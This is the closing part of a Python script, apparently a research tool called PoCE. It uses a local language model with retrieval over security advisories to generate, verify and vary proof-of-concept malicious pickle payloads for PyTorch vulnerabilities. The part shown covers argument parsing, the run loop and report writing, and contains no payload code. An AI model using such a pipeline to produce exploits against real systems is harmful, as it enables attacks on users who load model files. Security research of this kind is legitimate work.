    return {'ghsa_id': ghsa_id, 'status': 'OK', 'poc_script': str(poc_dir / 'reproduce.py'), 'marker_content': marker_content, 'poc_elapsed_s': round(poc_elapsed, 1), 'var_elapsed_s': round(var_elapsed, 1), 'total_elapsed_s': round(total_elapsed, 1), 'variants': variants}

def write_report(results: list, model: str, total_elapsed: float) -> Path:
    report_path = OUTPUT_DIR / 'report.md'
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ok = [r for r in results if r.get('status') == 'OK']
    total_vars = sum((len(r.get('variants', [])) for r in ok))
    lines = ['# PoCE — PyTorch Run Report', f'**Date:** {ts}  |  **Model:** `{model}`  |  **Conda env:** `{CONDA_ENV}`', '', '## Summary', '| Metric | Value |', '|--------|-------|', f'| Entries processed     | {len(results)} |', f'| PoC verified          | {len(ok)} / {len(results)} |', f'| Total variants        | {total_vars} |', f'| Total time            | {total_elapsed:.1f}s  ({total_elapsed / 60:.1f}m) |', '', '## Per-Entry Results', '']
    for r in results:
        if r['status'] != 'OK':
            lines += [f'### {r['ghsa_id']} — {r['status']}', '']
            continue
        lines += [f'### {r['ghsa_id']}', f'- **Marker**   : `{r.get('marker_content', '')}`', f'- **Variants** : {len(r.get('variants', []))}', f'- **Time**     : PoC {r.get('poc_elapsed_s', '-')}s | Variants {r.get('var_elapsed_s', '-')}s', '']
        for v in r.get('variants', []):
            lines.append(f'  - variant_{v['var_num']}  gadget=`{v['gadget']}`  s={v['session']} r={v['refinement']}  ({v['elapsed_s']}s)')
        lines.append('')
    report_path.write_text('\n'.join(lines))
    return report_path

def main() -> None:
    global OLLAMA_MODEL, OLLAMA_BASE_URL, RAG_TOP_K, T_SESSIONS, I_REFINEMENTS, CONDA_ENV
    global ABLATION_NO_RAG, ABLATION_NO_REFINE_LOG
    parser = argparse.ArgumentParser(description='PoCE — PyTorch PoC Engine')
    parser.add_argument('--entry', default=None)
    parser.add_argument('--sessions', type=int, default=T_SESSIONS)
    parser.add_argument('--refine', type=int, default=I_REFINEMENTS)
    parser.add_argument('--top-k', type=int, default=RAG_TOP_K)
    parser.add_argument('--model', default=OLLAMA_MODEL)
    parser.add_argument('--conda-env', default=CONDA_ENV)
    parser.add_argument('--ollama-url', default=OLLAMA_BASE_URL)
    parser.add_argument('--skip-verified', action='store_true')
    parser.add_argument('--no-rag', action='store_true')
    parser.add_argument('--no-refine-log', action='store_true')
    args = parser.parse_args()
    OLLAMA_MODEL = args.model
    OLLAMA_BASE_URL = args.ollama_url
    RAG_TOP_K = args.top_k
    T_SESSIONS = args.sessions
    I_REFINEMENTS = args.refine
    CONDA_ENV = args.conda_env
    ABLATION_NO_RAG = args.no_rag
    ABLATION_NO_REFINE_LOG = args.no_refine_log
    for d in [OUTPUT_DIR, WORK_DIR, POC_DIR, VAR_DIR]:
        d.mkdir(parents=True, exist_ok=True)
    log(f'[Init] PoCE-PyTorch  model={OLLAMA_MODEL}  T={T_SESSIONS}  I={I_REFINEMENTS}  k={RAG_TOP_K}')
    log(f'[Init] output → {OUTPUT_DIR}')
    if check_ollama(OLLAMA_BASE_URL):
        log(f'[Init] Ollama HTTP OK at {OLLAMA_BASE_URL}')
    else:
        log(f'[Init] Ollama not reachable at {OLLAMA_BASE_URL}')
    if not DATASET_PATH.exists():
        log(f'[Init] ERROR: dataset not found at {DATASET_PATH}')
        sys.exit(1)
    with open(DATASET_PATH) as fh:
        summary = json.load(fh)
    entries = summary['poc_entries']
    all_entries = {e['id']: e for e in entries}
    log(f'[Init] {len(entries)} advisories loaded')
    anchor = all_entries.get(DEFAULT_ANCHOR_ID, entries[0])
    log('[Planner] Building RAG corpus ...')
    corpus = build_rag_corpus(entries)
    if args.entry:
        targets = [e for e in entries if e['id'] == args.entry]
        if not targets:
            log(f"[Init] Entry '{args.entry}' not in dataset")
            sys.exit(1)
    else:
        targets = entries
    if args.skip_verified:
        before = len(targets)
        targets = [e for e in targets if not (POC_DIR / e['id'] / 'payload.pkl').exists()]
        log(f'[Init] --skip-verified: skipped {before - len(targets)}')
    log(f'[Init] Processing {len(targets)} target(s)')
    run_start = time.time()
    results: list = []
    for entry in targets:
        r = process_entry(entry, corpus, all_entries, anchor, T_SESSIONS, I_REFINEMENTS)
        results.append(r)
    total_elapsed = time.time() - run_start
    results_json = OUTPUT_DIR / 'results.json'
    with open(results_json, 'w') as fh:
        json.dump(results, fh, indent=2)
    report = write_report(results, OLLAMA_MODEL, total_elapsed)
    if WORK_DIR.exists():
        shutil.rmtree(WORK_DIR)
    ok = [r for r in results if r.get('status') == 'OK']
    total_vars = sum((len(r.get('variants', [])) for r in ok))
    log(f'\n{'=' * 62}')
    log(f'  DONE')
    log(f'  PoC verified   : {len(ok)}/{len(targets)}')
    log(f'  Variants       : {total_vars}')
    log(f'  Total time     : {total_elapsed:.1f}s  ({total_elapsed / 60:.1f}m)')
    log(f'  POC pickles    : {POC_DIR}/')
    log(f'  Variant pickles: {VAR_DIR}/')
    log(f'  Report         : {report}')
    log(f'  Results JSON   : {results_json}')
    log(f'{'=' * 62}')
if __name__ == '__main__':
    main()